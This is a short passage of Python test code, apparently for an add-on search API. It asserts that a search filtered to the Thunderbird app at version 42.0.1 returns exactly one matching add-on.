        assert data['results'][0]['id'] == addon.pk

        data = self.perform_search(self.url, {'app': 'thunderbird',
                                              'appversion': '42.0.1'})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == tb_addon.pk
